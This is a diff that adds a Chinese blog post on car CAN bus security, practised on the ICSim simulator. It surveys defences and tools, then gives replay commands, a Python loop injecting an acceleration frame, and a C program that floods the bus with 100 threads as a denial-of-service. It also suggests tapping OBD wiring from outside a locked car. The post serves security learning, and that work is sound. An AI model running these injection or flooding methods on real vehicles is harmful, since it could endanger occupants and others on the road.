@@ -1,0 +1,712 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+<head>
+  <meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=2">
+<meta name="theme-color" content="#222">
+<meta name="generator" content="Hexo 6.3.0">
+  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png">
+  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon-32x32.webp">
+  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon-16x16.webp">
+  <link rel="mask-icon" href="/images/logo.svg" color="#222">
+
+<link rel="stylesheet" href="/css/main.css">
+
+
+<link rel="stylesheet" href="/lib/font-awesome/css/all.min.css">
+  <link rel="stylesheet" href="/lib/pace/pace-theme-flash.min.css">
+  <script src="/lib/pace/pace.min.js"></script>
+
+<script id="hexo-configurations">
+    var NexT = window.NexT || {};
+    var CONFIG = {"hostname":"pluseven-sechs.github.io","root":"/","scheme":"Pisces","version":"7.8.0","exturl":false,"sidebar":{"position":"left","display":"post","padding":18,"offset":12,"onmobile":false},"copycode":{"enable":true,"show_result":true,"style":"mac"},"back2top":{"enable":true,"sidebar":false,"scrollpercent":false},"bookmark":{"enable":false,"color":"#222","save":"auto"},"fancybox":false,"mediumzoom":false,"lazyload":false,"pangu":false,"comments":{"style":"tabs","active":null,"storage":true,"lazyload":false,"nav":null},"algolia":{"hits":{"per_page":10},"labels":{"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}},"localsearch":{"enable":true,"trigger":"auto","top_n_per_article":1,"unescape":false,"preload":false},"motion":{"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}},"path":"search.xml"};
+  </script>
+
+  <meta name="description" content="我个人对车联网安全算是倾慕已久（bushi，想想吧，超巨型遥控车，属实有点酷炫。从另一个方面看，因物理意义上的人是确确实实坐在车里的，这和传统的虚拟战场攻防区别开，赋予了车联网安全特别的意义。 现代汽车产业发展迅速，传统汽车再满足不了人民日益增长的美好生活需要（最政治正确的一集。早期的车辆是没有电气系统的，发动机以及相关机械功能的工作都是纯机械驱动；没有空调，没有灯。但这样汽车永远只会是代步工具">
+<meta property="og:type" content="article">
+<meta property="og:title" content="浅谈车联网CAN总线安全（基于ICSim">
+<meta property="og:url" content="https://pluseven-sechs.github.io/%E6%B5%85%E8%B0%88%E8%BD%A6%E8%81%94%E7%BD%91CAN%E6%80%BB%E7%BA%BF%E5%AE%89%E5%85%A8%EF%BC%88%E5%9F%BA%E4%BA%8EICSim/index.html">
+<meta property="og:site_name" content="今天你丢大包了吗">
+<meta property="og:description" content="我个人对车联网安全算是倾慕已久（bushi，想想吧，超巨型遥控车，属实有点酷炫。从另一个方面看，因物理意义上的人是确确实实坐在车里的，这和传统的虚拟战场攻防区别开，赋予了车联网安全特别的意义。 现代汽车产业发展迅速，传统汽车再满足不了人民日益增长的美好生活需要（最政治正确的一集。早期的车辆是没有电气系统的，发动机以及相关机械功能的工作都是纯机械驱动；没有空调，没有灯。但这样汽车永远只会是代步工具">
+<meta property="og:locale" content="zh_CN">
+<meta property="article:published_time" content="2024-04-24T14:48:17.000Z">
+<meta property="article:modified_time" content="2024-04-26T04:19:54.058Z">
+<meta property="article:author" content="Arawn">
+<meta name="twitter:card" content="summary">
+
+<link rel="canonical" href="https://pluseven-sechs.github.io/%E6%B5%85%E8%B0%88%E8%BD%A6%E8%81%94%E7%BD%91CAN%E6%80%BB%E7%BA%BF%E5%AE%89%E5%85%A8%EF%BC%88%E5%9F%BA%E4%BA%8EICSim/">
+
+
+<script id="page-configurations">
+  // https://hexo.io/docs/variables.html
+  CONFIG.page = {
+    sidebar: "",
+    isHome : false,
+    isPost : true,
+    lang   : 'zh-CN'
+  };
+</script>
+
+  <title>浅谈车联网CAN总线安全（基于ICSim | 今天你丢大包了吗</title>
+  
+
+
+
+
+
+
+  <noscript>
+  <style>
+  .use-motion .brand,
+  .use-motion .menu-item,
+  .sidebar-inner,
+  .use-motion .post-block,
+  .use-motion .pagination,
+  .use-motion .comments,
+  .use-motion .post-header,
+  .use-motion .post-body,
+  .use-motion .collection-header { opacity: initial; }
+
+  .use-motion .site-title,
+  .use-motion .site-subtitle {
+    opacity: initial;
+    top: initial;
+  }
+
+  .use-motion .logo-line-before i { left: initial; }
+  .use-motion .logo-line-after i { right: initial; }
+  </style>
+</noscript>
+
+</head>
+
+<body itemscope itemtype="http://schema.org/WebPage">
+  <div class="container use-motion">
+    <div class="headband"></div>
+
+    <header class="header" itemscope itemtype="http://schema.org/WPHeader">
+      <div class="header-inner"><div class="site-brand-container">
+  <div class="site-nav-toggle">
+    <div class="toggle" aria-label="切换导航栏">
+      <span class="toggle-line toggle-line-first"></span>
+      <span class="toggle-line toggle-line-middle"></span>
+      <span class="toggle-line toggle-line-last"></span>
+    </div>
+  </div>
+
+  <div class="site-meta">
+
+    <a href="/" class="brand" rel="start">
+      <span class="logo-line-before"><i></i></span>
+      <h1 class="site-title">今天你丢大包了吗</h1>
+      <span class="logo-line-after"><i></i></span>
+    </a>
+      <p class="site-subtitle" itemprop="description">陈限方</p>
+  </div>
+
+  <div class="site-nav-right">
+    <div class="toggle popup-trigger">
+        <i class="fa fa-search fa-fw fa-lg"></i>
+    </div>
+  </div>
+</div>
+
+
+
+
+<nav class="site-nav">
+  <ul id="menu" class="main-menu menu">
+        <li class="menu-item menu-item-home">
+
+    <a href="/" rel="section"><i class="fa fa-home fa-fw"></i>首页</a>
+
+  </li>
+        <li class="menu-item menu-item-about">
+
+    <a href="/about/" rel="section"><i class="fa fa-user fa-fw"></i>关于</a>
+
+  </li>
+        <li class="menu-item menu-item-categories">
+
+    <a href="/categories/" rel="section"><i class="fa fa-th fa-fw"></i>分类</a>
+
+  </li>
+        <li class="menu-item menu-item-archives">
+
+    <a href="/archives/" rel="section"><i class="fa fa-archive fa-fw"></i>归档</a>
+
+  </li>
+        <li class="menu-item menu-item-下载">
+
+    <a href="/download/" rel="section"><i class="fa fa-cloud fa-fw"></i>下载</a>
+
+  </li>
+        <li class="menu-item menu-item-待办">
+
+    <a href="/Todo_list/" rel="section"><i class="fa fa-calendar-alt fa-fw"></i>待办</a>
+
+  </li>
+      <li class="menu-item menu-item-search">
+        <a role="button" class="popup-trigger"><i class="fa fa-search fa-fw"></i>搜索
+        </a>
+      </li>
+  </ul>
+</nav>
+
+
+
+  <div class="search-pop-overlay">
+    <div class="popup search-popup">
+        <div class="search-header">
+  <span class="search-icon">
+    <i class="fa fa-search"></i>
+  </span>
+  <div class="search-input-container">
+    <input autocomplete="off" autocapitalize="off"
+           placeholder="搜索..." spellcheck="false"
+           type="search" class="search-input">
+  </div>
+  <span class="popup-btn-close">
+    <i class="fa fa-times-circle"></i>
+  </span>
+</div>
+<div id="search-result">
+  <div id="no-result">
+    <i class="fa fa-spinner fa-pulse fa-5x fa-fw"></i>
+  </div>
+</div>
+
+    </div>
+  </div>
+
+</div>
+    </header>
+
+    
+  <div class="back-to-top">
+    <i class="fa fa-arrow-up"></i>
+    <span>0%</span>
+  </div>
+
+
+    <main class="main">
+      <div class="main-inner">
+        <div class="content-wrap">
+          
+
+          <div class="content post posts-expand">
+            
+
+    
+  
+  
+  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
+    <link itemprop="mainEntityOfPage" href="https://pluseven-sechs.github.io/%E6%B5%85%E8%B0%88%E8%BD%A6%E8%81%94%E7%BD%91CAN%E6%80%BB%E7%BA%BF%E5%AE%89%E5%85%A8%EF%BC%88%E5%9F%BA%E4%BA%8EICSim/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="/images/avatar.webp">
+      <meta itemprop="name" content="Arawn">
+      <meta itemprop="description" content="美好的一天从丢大包开始">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="今天你丢大包了吗">
+    </span>
+      <header class="post-header">
+        <h1 class="post-title" itemprop="name headline">
+          浅谈车联网CAN总线安全（基于ICSim
+        </h1>
+
+        <div class="post-meta">
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="far fa-calendar"></i>
+              </span>
+              <span class="post-meta-item-text">发表于</span>
+
+              <time title="创建时间：2024-04-24 22:48:17" itemprop="dateCreated datePublished" datetime="2024-04-24T22:48:17+08:00">2024-04-24</time>
+            </span>
+              <span class="post-meta-item">
+                <span class="post-meta-item-icon">
+                  <i class="far fa-calendar-check"></i>
+                </span>
+                <span class="post-meta-item-text">更新于</span>
+                <time title="修改时间：2024-04-26 12:19:54" itemprop="dateModified" datetime="2024-04-26T12:19:54+08:00">2024-04-26</time>
+              </span>
+
+          
+            <span class="post-meta-item" title="阅读次数" id="busuanzi_container_page_pv" style="display: none;">
+              <span class="post-meta-item-icon">
+                <i class="fa fa-eye"></i>
+              </span>
+              <span class="post-meta-item-text">阅读次数：</span>
+              <span id="busuanzi_value_page_pv"></span>
+            </span><br>
+            <span class="post-meta-item" title="本文字数">
+              <span class="post-meta-item-icon">
+                <i class="far fa-file-word"></i>
+              </span>
+                <span class="post-meta-item-text">本文字数：</span>
+              <span>5.7k</span>
+            </span>
+            <span class="post-meta-item" title="阅读时长">
+              <span class="post-meta-item-icon">
+                <i class="far fa-clock"></i>
+              </span>
+                <span class="post-meta-item-text">阅读时长 &asymp;</span>
+              <span>10 分钟</span>
+            </span>
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+        <p>我个人对车联网安全算是倾慕已久（bushi，想想吧，超巨型遥控车，属实有点酷炫。从另一个方面看，因物理意义上的人是确确实实坐在车里的，这和传统的虚拟战场攻防区别开，赋予了车联网安全特别的意义。<br />
+现代汽车产业发展迅速，传统汽车再满足不了人民日益增长的美好生活需要（最政治正确的一集。早期的车辆是没有电气系统的，发动机以及相关机械功能的工作都是纯机械驱动；没有空调，没有灯。但这样汽车永远只会是代步工具而无法满足驾驶员的驾驶体验。于是抛除掉基本的运载功能，各种子系统在不断增加，其中革命性的发展在20年代中期——电子控制单元（ECU）的出现，现代车辆已有数百个ECU，负责转向、加速、制动等等功能。1986年，德国公司Bosch开发出CAN总线来连接ECU。而在此之前，车载通信系统是通过点对点的布线系统实现的。随着车载电子元件越来越多，这种通信系统变得愈发笨重，而且维护费用非常昂贵。<br />
+对于CAN总线的安全性，由于这是一种低级协议，所以不存在内在的安全功能，所以其网络数据可以被任意截取。在大多数应用中，应用程序需要部署自己的安全机制，例如认证传入命令或网络上某些设备的存在。若不执行适当的安全措施，其他人可能设法在总线上插入消息。尽管一些安全关键功能（如修改固件，编程键或控制防抱死制动）存在密码，但这些系统并未普遍实施，并且密钥对的数量有限。<br />
+总的来说，CAN总线控制各种ECU怎么配合，即他们之间的通信。由此可以想象，如果有人能操控你的CAN总线进行命令控制，那是多么可怕的一件事。</p>
+<h1 id="防御措施">防御措施</h1>
+<p>车载加密技术：车载加密技术可以对车辆明文数据信息进行保护，有效防止攻击者利用传输信道窃取或破坏传输信息，进而保证数据传输的完整性和机密性，避免数据泄露的安全风险。Aminifar
+等提出了一种基于迭代分组密码的对称加密方法，并设置了机密保护与开销之间的权衡机制，以最大限度地提高机密性，同时保证实时性的要求。
+车载防火墙技术：防火墙技术可以对网络流量进行监控，根据事先制定的安全策略对数据流量进行管控。Luo等为车载网络设计一个安全网关，基于威胁分析定义了车载网关的安全要求，提出将安全通信、密钥主控和防火墙作为保护汽车网关的安全机制，安全通信机制主要包含消息身份验证和数据加密。
+车载入侵检测技术：相较于静态的车载入侵防御系统（intrusion prevention
+system，IPS），车载入侵检测系统（intrusion detection
+system，IDS）可以对网络流量进行监控，是一种在不影响网络性能前提下的主动防御手段，主要有基于异常IDS、基于签名IDS、基于规范IDS、基于混合IDS、基于指纹
+IDS、基于参数监控 IDS、基于信息熵IDS 和基于机器学习 IDS。其中，基于异常
+IDS为业内常用的入侵检测方法，将实时数据与正常行为数据进行比对，利用训练好的模型分析结果和常规值的偏差与阈值之间的关系，定位安全风险。
+车载安全审计技术：利用车载终端记录的访问日志进行审计和监管，也是车载终端系统安全防护的重要手段之一。Checkoway
+等通过实验验证了审计系统会在发现异常或攻击事件时启动处理程序，降低潜在攻击的威胁。常见的安全审计方法有基于数理统计的安全审计、基于特征匹配的安全审计以及基于预测感知的安全审计。
+车载网络安全认证技术：车载网络安全认证技术可以增强车载系统的安全性。Jo
+等提出了一种Mauth-CAN认证方法，利用ECU与验证器共享密钥，验证器可以安全有效地为ECU分配种子值，进而规避由ECU发起伪造攻击的安全风险。</p>
+<h1 id="仿真环境与基本操作">仿真环境与基本操作</h1>
+<h2 id="icsim">ICSim</h2>
+<pre class="line-numbers language-none"><code class="language-none">.&#x2F;setup_vcan.sh # 初始化，每次重启后都要重新运行
+.&#x2F;icsim vcan0 # 仪表界面
+.&#x2F;controls vcan0 # 控制界面<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre>
+<p>其中启动 setup_vcan.sh 主要功能是加载CAN和vCAN（virtual controller
+area network）网络模块。并创建名为vcan0的网络设备打开连接。<br />
+| 功能 | 按键 | | --------------- | ----------------- | | 加速 |
+上方向键 | | 左转向 | 左方向键 | | 右转向 | 右方向键 | | 开/关左车门前锁
+| 右/左shift + A | | 开/关右车门前锁 | 右/左shift + B | |
+开/关左车门后锁 | 右/左shift + X | | 开/关右车门后锁 | 右/左shift + y |
+| 开启所有车门锁 | 左shift + 右shift | | 关闭所有车门锁 | 右shift +
+左shift |</p>
+<h2 id="can-utils">can-utils</h2>
+<pre class="line-numbers language-none"><code class="language-none">sudo apt-get install can-utils<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+<p>这是一个用于控制与 CAN 总线通信的工具集合，具体包括如下：<br />
+cansend：用于向 CAN 总线发送单个 CAN
+帧。可以指定帧的标识符、数据和其他参数。<br />
+candump：用于监听 CAN
+总线上的数据帧，并将接收到的帧显示在终端上。可用于实时监测 CAN
+总线的数据流。<br />
+canplayer：用于回放记录在文件中的 CAN 数据帧。可以模拟之前捕获的 CAN
+数据，对系统进行测试和验证。<br />
+cangen：用于生成随机的 CAN 数据帧，用于测试和模拟不同的 CAN
+数据场景。<br />
+cansniffer：用于监视 CAN 总线上的数据帧，并将其显示在终端上。与 candump
+不同的是，cansniffer
+可以提供更详细的信息，如错误检测和计数器统计等。<br />
+canbusload：用于测试 CAN 总线的负载容量。通过生成大量的 CAN
+数据帧，可以评估 CAN 总线的性能和稳定性。</p>
+<h2 id="socketcand">socketcand</h2>
+<p>用于在Linux系统上实现CAN（Controller Area
+Network）总线的通信。它提供了一个简单且灵活的接口，使用户能够通过套接字（sockets）与CAN总线进行通信。我们需要用这个工具来让SavvyCAN跟CAN总线通信。</p>
+<pre class="line-numbers language-none"><code class="language-none">下载socketcand
+
+git clone https:&#x2F;&#x2F;github.com&#x2F;linux-can&#x2F;socketcand.git
+cd socketcand
+
+获取缺少的文件
+
+wget https:&#x2F;&#x2F;raw.githubusercontent.com&#x2F;dschanoeh&#x2F;socketcand&#x2F;master&#x2F;config.h.in
+
+编译安装
+
+autoconf
+.&#x2F;configure
+make clean
+make
+sudo make install<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+<h2 id="savvycan">SavvyCAN</h2>
+<p>SavvyCAN是一个基于多个QT平台的C++程序，主要用于CAN数据的逆向分析和捕获。
+<pre class="line-numbers language-none"><code class="language-none"># 直接下载二进制文件进行使用
+wget https:&#x2F;&#x2F;github.com&#x2F;collin80&#x2F;SavvyCAN&#x2F;releases&#x2F;download&#x2F;continuous&#x2F;SavvyCAN-1999da8-x86_64.AppImage
+chmod 777 SavvyCAN-1999da8-x86_64.AppImage
+.&#x2F;SavvyCAN-044fea3-x86_64.AppImage<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre> 需先安装<a
+target="_blank" rel="noopener" href="https://download.qt.io/archive/qt/5.14/5.14.2/">Qt5环境</a>，注意安装时不能只安装Qt
+creator,全部下下来内存还挺大的，大约五六个G，注意留好空间。<br />
+然后在 Connection-&gt;Open Connection Window-&gt;Add New Device
+Connection 中选择 QT SerialBus Devices，将 SerialBus Devices 选择为
+socketcan，将port选择为虚拟端口vcan0，就可以开始捕捉与过滤了。</p>
+<h2 id="wireshark">WireShark</h2>
+<p>无处不在</p>
+<h1 id="如何物理意义上接入can网络">如何物理意义上接入CAN网络</h1>
+<p>通过OBD可以直接访问CAN。车上诊断系统（On-Board
+Diagnostics），是一种装置于车中以监控车辆运行状态与回报异常的系统，可于车辆的子系统出现问题时，产生故障代码和提醒讯号通知车主和车厂诊断维修。
+示例位置：<a
+target="_blank" rel="noopener" href="https://www.bilibili.com/video/BV1xh411Q7AP/?spm_id_from=333.337.search-card.all.click&amp;vd_source=925702a604089f3c4965c6447751f6ed">江铃车系的OBD诊断接口</a>
+得知车辆的大概布线的话，可以从锁着的车外卸下铁皮，从外部接入OBD的布线。</p>
+<h1 id="重放攻击">重放攻击</h1>
+<p>重放攻击(Replay
+attack)是一种网络攻击，指攻击者发送一个目的主机已接收过的包，来达到欺骗系统的目的，主要用于身份认证过程，破坏认证的正确性。攻击者利用网络监听或者其他方式盗取认证凭据，之后再把它重新发给认证服务器。从这个解释上理解，加密可以有效防止会话劫持，但是却防止不了重放攻击。重放攻击任何网络通讯过程中都可能发生。<br />
+在仿真模拟中，可利用can-utils中的candump与canplayer工具来实现数据包的捕捉与重放。
+<pre class="line-numbers language-none"><code class="language-none">candump -l vcan0 # 将数据包存储到log中
+canplayer -I 文件名.log # 进行重放攻击
+&#96;&#96;&#96;  
+危害举例：车辆跟充电桩之间的通信部分也是CAN通信，如果CAN流量能够进行重放，没有一定的防御机制，那么攻击者可能可以通过这种方式进行恶意扣费等操作，即捕捉你付费的数据包重复发送。  
+加速正常重放只能加速一下，写一个python程序：<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre> import os import time</p>
+<p>while True: os.system("cansend vcan0 244#0000003894") time.sleep(1)
+<pre class="line-numbers language-none"><code class="language-none">
+# 消息逆向
+
+虽然流量重放能够让我们触发特定的操作，但实际上我们不知道是哪一帧能够触发这个操作，这就需要我们对消息进行逆向。根据抓取的CAN数据还原其外在的体现，具体分析指令对应的功能。CAN 总线命令的语义通常可分为两类：（1） 控制，它操作车辆的物理部件，如解锁车门和启动发动机;（2） 诊断，用于查询车辆的数据（如速度和温度）。对于每个语义含义，都有一个对 CAN 总线命令的一对一映射。例如，对于丰田普锐斯，CAN总线命令标识符&quot;0x750&quot;是指主体，&quot;0x7C4&quot;用于空调。
+这里随便举个例子来说明其具体格式<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre> (1714014624.483285) vcan0 19B#000000000000 # 对应 (时间戳)
+can接口 仲裁ID#数据 # 仲裁ID的数字越低，在网络上的优先级就越高。
+<pre class="line-numbers language-none"><code class="language-none">分析数据可以根据log文件慢慢排查，就是删删删（二分法）不停运行看到底是哪行负责。第一次获取log文件手慢了直接获取了一万六千多行...找不了一点，后面手快缩短到五千行，但也二分了19次才找到。  
+快一点的方法就是利用cansniffer工具看动态的log，即操作一下看看是哪些数据在变化，但咱属实眼神不好...（Bushi。就不放静态的图了，因为动态的看一下还蛮明显的，以开车门举例，可以明显发现进行开车门操作时多了一行数据。  <span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre> cansniffer -c vcan0 <pre class="line-numbers language-none"><code class="language-none">另外，SavvyCAN中的sniffer要更好找一些，开启notch过滤直接世界都清净了。  
+
+# 基于CAN总线协议仲裁机制的DOS攻击
+
+一句话概括CAN总线的机制：CAN总线是一种基于“先来后到、无损仲裁”机制、多主（无主）结构、具有帧ID、应用数据最多8个字节、采用差分电平的国际标准现场总线。细细说来，“先来后到”是说总线空闲时，任何一个CAN节点都可以发送数据，谁先来谁先发，避免内卷，从我做起，哦耶。“无损仲裁”是说两个节点同时发的时候，则比较数据帧ID部分来决定谁先发送，ID小的先发，ID大的自动退出。而退出后数据也不会丢失，而是等待下一个空闲期再尝试发送。“多主”指每个节点的地位相对来说是平等，都可以主动发起数据。    
+这里可能会发现这个机制和p-坚持CSMA有些类似，但又稍有不同。其一，CSMA碰了再改，CAN先比再发。当多个节点监听到信道为空闲时，CSMA可能同时发送数据而导致碰撞，然后等待随机时间再发送；CAN中尝试发送前会先比较。其二，CSMA如果发生碰撞，数据可能丢失；CAN即使发生碰撞，数据也不会丢失。另外，简要分析一下这样设计的原因，CSMA粗糙一些，目的是网络中的节点共享通信信道，主要希望减少碰撞而增加网络的吞吐量和效率；CAN精细一些，目的是提供可靠的实时通信，主要希望保证数据的准确性。
+我们先找到两个低优先级的操作，为了做对比实验<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre> cansend vcan0
+19B#00000E000000 # 开车门 cansend vcan0 19B#00000F000000 # 关车门 #
+找一个高于他们的，这里使用的左转向灯 cansend vcan0 188#01000000 #
+开左转向灯 <pre class="line-numbers language-none"><code class="language-none">&#96;&#96;&#96;
+#include &lt;stdio.h&gt;
+#include &lt;stdlib.h&gt;
+#include &lt;unistd.h&gt;
+#include &lt;pthread.h&gt;
+
+void* send_message(void* arg) &#123;
+    while (1) &#123;
+        system(&quot;cansend vcan0 188#01000000&quot;);
+    &#125;
+
+    return NULL;
+&#125;
+
+int main() &#123;
+    pthread_t threads[100];
+
+
+    for (int i &#x3D; 0; i &lt; 100; i++) &#123;
+        pthread_create(&amp;threads[i], NULL, send_message, NULL);
+    &#125;
+
+    while (1) &#123;
+        sleep(1); 
+    &#125;
+
+    return 0;
+&#125;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+这段代码的作用是创建了100个线程，每个线程都会不断地向CAN总线发送相同的消息，模拟了多个节点同时发送数据的情况。
+<pre class="line-numbers language-none"><code class="language-none">gcc -o attack main.c -pthread<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+编译为attack可执行文件后执行，发现左转灯一直在开。随后利用模拟器进行开关车门的操作，会发现好几次之后才成功。所以只能是造成部分CAN数据干扰，不能百分百干扰，不过还是可以感觉到是有变化的，部分数据会产生丢失，造成对应的指令没有执行成功。</p>
+
+    </div>
+
+    
+    
+    
+        <div class="reward-container">
+  <div>“富哥vivo50看看实力”</div>
+  <button onclick="var qr = document.getElementById('qr'); qr.style.display = (qr.style.display === 'none') ? 'block' : 'none';">
+    打赏
+  </button>
+  <div id="qr" style="display: none;">
+      
+      <div style="display: inline-block;">
+        <img src="/images/wechatpay.webp" alt="Arawn 微信支付">
+        <p>微信支付</p>
+      </div>
+
+  </div>
+</div>
+
+        
+
+<div>
+<ul class="post-copyright">
+  <li class="post-copyright-author">
+    <strong>本文作者： </strong>Arawn
+  </li>
+  <li class="post-copyright-link">
+    <strong>本文链接：</strong>
+    <a href="https://pluseven-sechs.github.io/%E6%B5%85%E8%B0%88%E8%BD%A6%E8%81%94%E7%BD%91CAN%E6%80%BB%E7%BA%BF%E5%AE%89%E5%85%A8%EF%BC%88%E5%9F%BA%E4%BA%8EICSim/" title="浅谈车联网CAN总线安全（基于ICSim">https://pluseven-sechs.github.io/浅谈车联网CAN总线安全（基于ICSim/</a>
+  </li>
+  <li class="post-copyright-license">
+    <strong>版权声明： </strong>本博客所有文章除特别声明外，均采用 <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/" rel="noopener" target="_blank"><i class="fab fa-fw fa-creative-commons"></i>BY-NC-SA</a> 许可协议。转载请注明出处！
+  </li>
+</ul>
+</div>
+
+
+      <footer class="post-footer">
+
+        
+
+
+        
+    <div class="post-nav">
+      <div class="post-nav-item">
+    <a href="/MySQL-Lab-2-%E5%87%BD%E6%95%B0%E4%B8%8E%E5%AD%98%E5%82%A8%E8%BF%87%E7%A8%8B/" rel="prev" title="MySQL Lab_2 函数与存储过程">
+      <i class="fa fa-chevron-left"></i> MySQL Lab_2 函数与存储过程
+    </a></div>
+      <div class="post-nav-item"></div>
+    </div>
+      </footer>
+    
+  </article>
+  
+  
+  
+
+
+
+          </div>
+          
+
+<script>
+  window.addEventListener('tabs:register', () => {
+    let { activeClass } = CONFIG.comments;
+    if (CONFIG.comments.storage) {
+      activeClass = localStorage.getItem('comments_active') || activeClass;
+    }
+    if (activeClass) {
+      let activeTab = document.querySelector(`a[href="#comment-${activeClass}"]`);
+      if (activeTab) {
+        activeTab.click();
+      }
+    }
+  });
+  if (CONFIG.comments.storage) {
+    window.addEventListener('tabs:click', event => {
+      if (!event.target.matches('.tabs-comment .tab-content .tab-pane')) return;
+      let commentClass = event.target.classList[1];
+      localStorage.setItem('comments_active', commentClass);
+    });
+  }
+</script>
+
+        </div>
+          
+  
+  <div class="toggle sidebar-toggle">
+    <span class="toggle-line toggle-line-first"></span>
+    <span class="toggle-line toggle-line-middle"></span>
+    <span class="toggle-line toggle-line-last"></span>
+  </div>
+
+  <aside class="sidebar">
+    <div class="sidebar-inner">
+
+      <ul class="sidebar-nav motion-element">
+        <li class="sidebar-nav-toc">
+          文章目录
+        </li>
+        <li class="sidebar-nav-overview">
+          站点概览
+        </li>
+      </ul>
+
+      <!--noindex-->
+      <div class="post-toc-wrap sidebar-panel">
+          <div class="post-toc motion-element"><ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link" href="#%E9%98%B2%E5%BE%A1%E6%8E%AA%E6%96%BD"><span class="nav-number">1.</span> <span class="nav-text">防御措施</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#%E4%BB%BF%E7%9C%9F%E7%8E%AF%E5%A2%83%E4%B8%8E%E5%9F%BA%E6%9C%AC%E6%93%8D%E4%BD%9C"><span class="nav-number">2.</span> <span class="nav-text">仿真环境与基本操作</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#icsim"><span class="nav-number">2.1.</span> <span class="nav-text">ICSim</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#can-utils"><span class="nav-number">2.2.</span> <span class="nav-text">can-utils</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#socketcand"><span class="nav-number">2.3.</span> <span class="nav-text">socketcand</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#savvycan"><span class="nav-number">2.4.</span> <span class="nav-text">SavvyCAN</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#wireshark"><span class="nav-number">2.5.</span> <span class="nav-text">WireShark</span></a></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#%E5%A6%82%E4%BD%95%E7%89%A9%E7%90%86%E6%84%8F%E4%B9%89%E4%B8%8A%E6%8E%A5%E5%85%A5can%E7%BD%91%E7%BB%9C"><span class="nav-number">3.</span> <span class="nav-text">如何物理意义上接入CAN网络</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#%E9%87%8D%E6%94%BE%E6%94%BB%E5%87%BB"><span class="nav-number">4.</span> <span class="nav-text">重放攻击</span></a></li></ol></div>
+      </div>
+      <!--/noindex-->
+
+      <div class="site-overview-wrap sidebar-panel">
+        <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
+    <img class="site-author-image" itemprop="image" alt="Arawn"
+      src="/images/avatar.webp">
+  <p class="site-author-name" itemprop="name">Arawn</p>
+  <div class="site-description" itemprop="description">美好的一天从丢大包开始</div>
+</div>
+<div class="site-state-wrap motion-element">
+  <nav class="site-state">
+      <div class="site-state-item site-state-posts">
+          <a href="/archives/">
+        
+          <span class="site-state-item-count">49</span>
+          <span class="site-state-item-name">日志</span>
+        </a>
+      </div>
+      <div class="site-state-item site-state-categories">
+            <a href="/categories/">
+          
+        <span class="site-state-item-count">10</span>
+        <span class="site-state-item-name">分类</span></a>
+      </div>
+  </nav>
+</div>
+  <div class="links-of-author motion-element">
+      <span class="links-of-author-item">
+        <a href="https://github.com/pluseven-Sechs" title="GitHub → https:&#x2F;&#x2F;github.com&#x2F;pluseven-Sechs" rel="noopener" target="_blank"><i class="fab fa-github fa-fw"></i>GitHub</a>
+      </span>
+      <span class="links-of-author-item">
+        <a href="mailto:pluseven.Sechs@outlook.com" title="E-Mail → mailto:pluseven.Sechs@outlook.com" rel="noopener" target="_blank"><i class="fa fa-envelope fa-fw"></i>E-Mail</a>
+      </span>
+  </div>
+
+
+
+      </div>
+
+    </div>
+  </aside>
+  <div id="sidebar-dimmer"></div>
+
+
+      </div>
+    </main>
+
+    <footer class="footer">
+      <div class="footer-inner">
+        
+
+        
+
+<div class="copyright">
+  
+  &copy; 
+  <span itemprop="copyrightYear">2024</span>
+  <span class="snow">
+    <i class="fa fa-bolt"></i>
+  </span>
+  <span class="author" itemprop="copyrightHolder">Arawn</span>
+    <span class="post-meta-divider">|</span>
+    <span class="post-meta-item-icon">
+      <i class="fa fa-chart-area"></i>
+    </span>
+    <span title="站点总字数">61k</span>
+    <span class="post-meta-divider">|</span>
+    <span class="post-meta-item-icon">
+      <i class="fa fa-coffee"></i>
+    </span>
+    <span title="站点阅读时长">1:51</span>
+</div>
+
+<!--
